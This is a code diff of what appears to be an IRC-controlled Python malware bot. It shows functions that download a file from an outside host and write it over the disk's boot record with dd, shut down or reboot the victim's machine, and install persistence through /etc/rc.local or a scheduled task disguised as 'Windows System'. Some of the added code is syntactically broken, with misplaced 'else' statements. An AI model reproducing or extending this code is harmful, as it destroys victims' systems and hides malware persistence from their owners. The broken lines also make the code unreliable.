@@ -201,48 +201,45 @@ def nyanmbr(): #download nyancat.mbr and over bootloader with it
 	if (operatingSystem != "windows" and operatingSystem != ""):
 		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
 		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
-		execute("rm -rf /tmp/nyan.mbr")
+		execute("rm -f /tmp/nyan.mbr")
 		sendData("Overwriting seems to have worked :3")
 
 def nap(): #shutdown the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -s -t 0")
-	elif operatingSystem == "linux":
-		execute("poweroff")
-	elif operatingSystem == "darwin":
-		execute("shutdown -h now")
-	else:
+	else: #any unix based OS will handle this correctly
 		execute("init 0")
 
 def reboot(): #reboot the computer
 	irc.close()
 	if operatingSystem == "windows": #if windows
 		execute("shutdown -r -t 0")
-	elif operatingSystem == "linux":
-		execute("init 6")
-	elif operatingSystem == "darwin":
-		execute ("shutdown -r now")
-	else:
+	else: #any unix based OS will handle this correctly
 		execute("init 6")
 
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
-	if operatingSystem == "linux": #if linux
-		path = "/etc/rc.local"
-	elif operatingSystem == "windows":
-		sendData("I'm on windows boss...")
+	if operatingSystem == "windows":
+		# sendData("I'm on windows boss...")
+		script = os.getcwd() + "\\" + argv[0]
+		output = execute("schtasks /Create /SC ONSTART /TN 'Windows System' /TR " + script)
+		sendData(output)
 		return
-	else:
-		sendData("I don't even know boss :(")
-		return
+	else
+		if operatingSystem == "linux": #if linux
+			path = "/etc/rc.local"
+		elif operatingSystem == "darwin": #if mac
+			sendData("don't know how to do that on mac yet.")
+			return
+			else
 
-	if os.access(path, os.W_OK): #check if we have write perms
-		outfile = open(path, 'a')
-		dir = execute("pwd")
-		outfile.write("/usr/bin/env python " + dir.strip() + "/" + argv[0])
-		sendData("Seems to have worked...")
-	else:
-		sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
+		if os.access(path, os.W_OK): #check if we have write perms
+			outfile = open(path, 'a')
+			dir = execute("pwd")
+			outfile.write("/usr/bin/env python " + dir.strip() + "/" + argv[0])
+			sendData("Seems to have worked...")
+		else:
+			sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
 
 def runFunction(cmd):
 	pos = cmd.find(" ")
